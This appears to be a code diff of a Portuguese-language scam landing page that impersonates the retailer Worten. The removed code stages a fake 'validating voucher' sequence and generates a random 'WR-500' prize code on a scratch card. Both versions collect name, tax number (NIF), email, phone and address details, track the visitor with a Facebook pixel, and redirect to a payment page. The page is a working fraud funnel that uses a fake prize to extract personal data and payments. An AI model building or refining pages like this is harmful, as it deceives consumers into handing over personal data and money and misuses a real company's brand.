-            <h2 id="legalTitle" style="color: #d32f2f; margin-bottom: 20px;"></h2>
-            <div id="legalBody" style="font-size: 13px; color: #555;"></div>
-        </div>
-    </div>
-
-    <!-- Shared Script for Modals -->
-    <!-- Audio Manager (Singleton) -->
-    <script src="audio-manager.js?v=37"></script>
-    <script src="script.js?v=37"></script>
-    <script src="waymb-service.js?v=37"></script>
 
     <script>
-        // Track InitiateCheckout on Form Submission
-        document.getElementById('claimForm').addEventListener('submit', function (e) {
-            // Check if form is valid (browser default validation)
-            if (this.checkValidity()) {
+        function openModal() {
+            document.getElementById('redemptionModal').style.display = 'flex';
+        }
+
+        function closeModal() {
+            document.getElementById('redemptionModal').style.display = 'none';
+        }
+
+        window.onclick = function (event) {
+            const modal = document.getElementById('redemptionModal');
+            if (event.target == modal) {
+                closeModal();
+            }
+        }
+
+        // --- Auto Formatting Logic ---
+        const zipInput = document.getElementById('zipInput');
+        const phoneInput = document.getElementById('phoneInput');
+
+        // Zip: 0000-000
+        zipInput.addEventListener('input', function (e) {
+            let val = e.target.value.replace(/\D/g, '');
+            if (val.length > 7) val = val.substring(0, 7);
+
+            if (val.length > 4) {
+                val = val.substring(0, 4) + '-' + val.substring(4);
+            }
+            e.target.value = val;
+        });
+
+        // Phone: Automatically add spaces or +351 if needed, simplifying to 9 digits visual
+        phoneInput.addEventListener('input', function (e) {
+            let val = e.target.value.replace(/\D/g, '');
+            // Allow user to type 351, strip it for local formatting, logic can vary.
+            // Simplest: Limit to 9 chars for PT number, or max 12 with code.
+
+            // User requested "limitar digitos". Assuming PT mobile: 9xx xxx xxx
+            if (val.startsWith('351')) {
+                val = val.substring(3);
+            }
+            if (val.length > 9) val = val.substring(0, 9);
+
+            // Format: 123 456 789
+            if (val.length > 6) {
+                val = val.substring(0, 3) + ' ' + val.substring(3, 6) + ' ' + val.substring(6);
+            } else if (val.length > 3) {
+                val = val.substring(0, 3) + ' ' + val.substring(3);
+            }
+            e.target.value = val;
+        });
+
+
+        function submitForm(e) {
+            e.preventDefault();
+            if (window.fbq) {
                 fbq('track', 'InitiateCheckout');
             }
-        });
-    </script>
 
-    <script>
-        // --- Generation Sequence ---
-        window.onload = () => {
-            document.body.style.opacity = '1';
+            const formData = new FormData(e.target);
+            const data = Object.fromEntries(formData.entries());
 
-            const overlay = document.getElementById('generation-overlay');
-            const spinner = document.getElementById('genSpinner');
-            const text = document.getElementById('genText');
-            const codeDisplay = document.querySelector('#voucher-code-display div:first-child');
-            const scanLine = document.getElementById('scanLine');
-            const formContainer = document.querySelector('.form-container');
-            const scratchWrapper = document.getElementById('scratch-wrapper');
+            // Clean phone for storage
+            data.phone = data.phone.replace(/\s/g, '');
+            // Append 351 if not present?
+            if (data.phone.length === 9) data.phone = '351' + data.phone;
 
-            // Block form initially
-            formContainer.classList.remove('visible');
-
-            // Step 1: Connecting (0-1.5s)
-            text.innerText = "A gerar o teu Código Único...";
-
-            // Step 2: Generating ID (1.5s)
-            setTimeout(() => {
-                text.innerText = "Validando Voucher...";
-                scanLine.style.display = 'block'; // Start scanning
-            }, 1500);
-
-            // Step 3: Show Scratch Card (3.5s)
-            setTimeout(() => {
-                spinner.style.display = 'none';
-                scanLine.style.display = 'none';
-                overlay.style.display = 'none'; // Reveal Voucher underneath
-                overlay.style.display = 'none'; // Reveal Voucher underneath
-
-                // Generate Random Code
-                const randomCode = 'WR-500-' + Math.random().toString(36).substr(2, 4).toUpperCase();
-                codeDisplay.innerText = randomCode;
-
-                // Show Scratch Area (Pop animation)
-                scratchWrapper.style.display = 'block';
-                // scratchWrapper.style.animation = 'pulse 0.5s ease-out'; // Removed to fix positioning glitch
-                initScratchCard();
-
-                text.innerHTML = "Código gerado! <span style='color: #d32f2f; font-weight:800; font-size: 14px; display: block; margin-top: 5px; background: #fff; padding: 5px; border-radius: 4px; border: 1px solid #ddd;'>RASPE PARA REVELAR (0%)</span>";
-            }, 3500);
-
-            // Step 4: Removed auto-reveal. Now controlled by scratch percentage.
-        };
-
-        function initScratchCard() {
-            const canvas = document.getElementById('scratch-canvas');
-            const wrapper = document.getElementById('scratch-wrapper');
-            // Set render resolution to match display size
-            canvas.width = wrapper.offsetWidth;
-            canvas.height = wrapper.offsetHeight;
-
-            const ctx = canvas.getContext('2d');
-            const width = canvas.width;
-            const height = canvas.height;
-            let isDrawing = false;
-
-            // --- 1. Realistic Silver Foil Effect ---
-            const grd = ctx.createLinearGradient(0, 0, width, height);
-            // Multi-stop metallic gradient
-            grd.addColorStop(0.00, '#a0a0a0');
-            grd.addColorStop(0.15, '#f0f0f0');
-            grd.addColorStop(0.30, '#d0d0d0');
-            grd.addColorStop(0.50, '#e8e8e8');
-            grd.addColorStop(0.65, '#c0c0c0');
-            grd.addColorStop(0.80, '#f0f0f0');
-            grd.addColorStop(1.00, '#909090');
-
-            ctx.fillStyle = grd;
-            ctx.fillRect(0, 0, width, height);
-
-            // Add Noise/Grain for realism
-            for (let i = 0; i < 5000; i++) {
-                const x = Math.random() * width;
-                const y = Math.random() * height;
-                ctx.fillStyle = Math.random() > 0.5 ? '#fff' : '#777';
-                ctx.globalAlpha = 0.2;
-                ctx.fillRect(x, y, 1, 1);
-            }
-            ctx.globalAlpha = 1.0;
-
-            // Pattern Text "WORTEN" faint
-            ctx.globalAlpha = 0.05;
-            ctx.fillStyle = '#000';
-            ctx.font = 'bold 12px Arial';
-            ctx.rotate(-20 * Math.PI / 180);
-            for (let y = -100; y < height * 2; y += 30) {
-                for (let x = -100; x < width * 2; x += 60) {
-                    ctx.fillText("WORTEN", x, y);
-                }
-            }
-            ctx.setTransform(1, 0, 0, 1, 0, 0); // Reset transform
-            ctx.globalAlpha = 1.0;
-
-            // Main Text "RASPE AQUI" (Etched look)
-            ctx.fillStyle = 'rgba(255,255,255,0.7)';
-            ctx.font = '900 20px "Open Sans", sans-serif'; // Reduced font size slightly
-            ctx.textAlign = 'center';
-            ctx.textBaseline = 'middle';
-            // Shadow for depth
-            ctx.shadowColor = "rgba(0,0,0,0.5)";
-            ctx.shadowBlur = 2;
-            ctx.shadowOffsetX = 1;
-            ctx.shadowOffsetY = 1;
-            ctx.fillText('RASPE AQUI', width / 2, height / 2);
-            ctx.shadowColor = "transparent"; // Reset
-
-            // --- Scratch Logic ---
-            const getPos = (e) => {
-                const rect = canvas.getBoundingClientRect();
-                const clientX = e.touches ? e.touches[0].clientX : e.clientX;
-                const clientY = e.touches ? e.touches[0].clientY : e.clientY;
-                return {
-                    x: clientX - rect.left,
-                    y: clientY - rect.top
-                };
-            };
-
-            const scratch = (x, y) => {
-                ctx.globalCompositeOperation = 'destination-out';
-                ctx.beginPath();
-                // Irregular brush shape for realism
-                ctx.arc(x, y, 15, 0, Math.PI * 2);
-                // Add jitter dots
-                ctx.arc(x + Math.random() * 10 - 5, y + Math.random() * 10 - 5, 10, 0, Math.PI * 2);
-                ctx.fill();
-            };
-
-            // --- Audio Logic (ASMR Scratch) ---
-            // Uses AudioManager (Singleton)
-            let gainNode, noiseSource;
-            let audioTimeout;
-
-            const playScratchSound = () => {
-                const audioCtx = AudioManager.getContext();
-                if (!audioCtx) return;
-
-                // Ensure context is running (it should be if unlocked)
-                if (audioCtx.state === 'suspended') {
-                    audioCtx.resume();
-                }
-
-                if (!gainNode) {
-                    // Lazy init noise source
-                    const bufferSize = audioCtx.sampleRate;
-                    const buffer = audioCtx.createBuffer(1, bufferSize, audioCtx.sampleRate);
-                    const data = buffer.getChannelData(0);
-                    for (let i = 0; i < bufferSize; i++) {
-                        data[i] = Math.random() * 2 - 1;
-                    }
-
-                    noiseSource = audioCtx.createBufferSource();
-                    noiseSource.buffer = buffer;
-                    noiseSource.loop = true;
-
-                    const filter = audioCtx.createBiquadFilter();
-                    filter.type = 'lowpass';
-                    filter.frequency.value = 350;
-                    filter.Q.value = 1.0;
-
-                    gainNode = audioCtx.createGain();
-                    gainNode.gain.value = 0;
-
-                    noiseSource.connect(filter);
-                    filter.connect(gainNode);
-                    gainNode.connect(audioCtx.destination);
-
-                    noiseSource.start();
-                }
-
-                if (gainNode) {
-                    gainNode.gain.cancelScheduledValues(audioCtx.currentTime);
-                    gainNode.gain.setTargetAtTime(0.4, audioCtx.currentTime, 0.05);
-
-                    clearTimeout(audioTimeout);
-                    audioTimeout = setTimeout(() => {
-                        if (gainNode) gainNode.gain.setTargetAtTime(0, audioCtx.currentTime, 0.1);
-                    }, 120);
-                }
-            };
-
-            const stopScratchSound = () => {
-                const audioCtx = AudioManager.getContext();
-                if (gainNode && audioCtx) {
-                    gainNode.gain.setTargetAtTime(0, audioCtx.currentTime, 0.1);
-                }
-            };
-
-            const start = (e) => {
-                isDrawing = true;
-                // No need to init audio here, it's lazy loaded in playScratchSound
-            };
-            const end = (e) => {
-                isDrawing = false;
-                stopScratchSound();
-                checkProgress();
-            };
-            const move = (e) => {
-                if (!isDrawing) return;
-                e.preventDefault();
-                const pos = getPos(e);
-                scratch(pos.x, pos.y);
-                playScratchSound();
-
-                // Optional: Update progress on move (throttle)
-                if (Math.random() > 0.8) checkProgress(true); // Don't heavy calc every frame
-            };
-
-            canvas.addEventListener('mousedown', start);
-            canvas.addEventListener('mousemove', move);
-            canvas.addEventListener('mouseup', end);
-            canvas.addEventListener('touchstart', start);
-            canvas.addEventListener('touchmove', move);
-            canvas.addEventListener('touchend', end);
-
-            let completed = false;
-
-            function checkProgress(justUpdateText = false) {
-                if (completed) return;
-
-                const imgData = ctx.getImageData(0, 0, width, height);
-                const pixels = imgData.data;
-                let transparent = 0;
-                // Sampling optimization (check every 64th pixel)
-                for (let i = 0; i < pixels.length; i += 64) {
-                    if (pixels[i + 3] < 128) transparent++;
-                }
-                const percent = Math.floor((transparent / (pixels.length / 64)) * 100);
-
-                // Update Text (Using visible instruction-text)
-                const textSpan = document.getElementById('instruction-text');
-                if (textSpan) textSpan.innerHTML = `RASPE PARA REVELAR O CÓDIGO <span style='font-weight:900; color:#16a34a;'>(${Math.min(percent, 100)}%)</span>`;
-
-                if (!justUpdateText && percent > 45) { // Threshold
-                    completed = true;
-
-                    // Auto reveal animation
-                    const fadeOut = setInterval(() => {
-                        const currentOp = parseFloat(canvas.style.opacity || 1);
-                        if (currentOp > 0) {
-                            canvas.style.opacity = (currentOp - 0.1).toString();
-                        } else {
-                            clearInterval(fadeOut);
-                            canvas.style.display = 'none';
-                        }
-                    }, 50);
-
-                    // Show Modal
-                    document.getElementById('codeRevealedModal').style.display = 'flex';
-
-                    document.querySelector('.form-container').classList.add('visible');
-
-                    // Reveal font style tweak (Space Mono)
-                    document.getElementById('voucher-code-display').style.fontFamily = "'Space Mono', monospace";
-                }
-            }
+            localStorage.setItem('shippingData', JSON.stringify(data));
+            window.location.href = 'payment.html';
         }
-
-        // Modal Helper
-        window.closeRevealedModal = () => {
-            document.getElementById('codeRevealedModal').style.display = 'none';
-            // Scroll to form slightly
-            setTimeout(() => {
-                document.querySelector('.form-container').scrollIntoView({
-                    behavior: 'smooth',
-                    block: 'start'
-                });
-            }, 300);
-        }
-
-        // Input Masks
-        const nifInput = document.querySelector('input[type="tel"][maxlength="9"]');
-        const phoneInput = document.getElementById('userPhone');
-
-        if (nifInput) {
-            nifInput.addEventListener('input', (e) => {
-                e.target.value = e.target.value.replace(/\D/g, '').slice(0, 9);
-            });
-        }
-
-        if (phoneInput) {
-            phoneInput.addEventListener('input', (e) => {
-                let x = e.target.value.replace(/\D/g, '').match(/(\d{0,3})(\d{0,3})(\d{0,3})/);
-                e.target.value = !x[2] ? x[1] : x[1] + ' ' + x[2] + (x[3] ? ' ' + x[3] : '');
-            });
-        }
-
-        // --- Handle Form Submit (Save Data & Redirect) ---
-        document.getElementById('claimForm').addEventListener('submit', (e) => {
-            e.preventDefault();
-
-            const btn = document.querySelector('.continue-btn');
-
-            // Simple loading state
-            btn.disabled = true;
-            btn.style.opacity = '0.7';
-            btn.innerText = 'A PROCESSAR...';
-
-            // Save data for next step
-            const userData = {
-                name: document.querySelector('input[type="text"]').value,
-                nif: nifInput.value,
-                email: document.querySelector('input[type="email"]').value,
-                phone: phoneInput.value
-            };
-            localStorage.setItem('wortenUserData', JSON.stringify(userData));
-
-            // Quick redirect
-            setTimeout(() => {
-                window.location.href = 'payment.html';
-            }, 300);
-        });
     </script>
 </body>
 
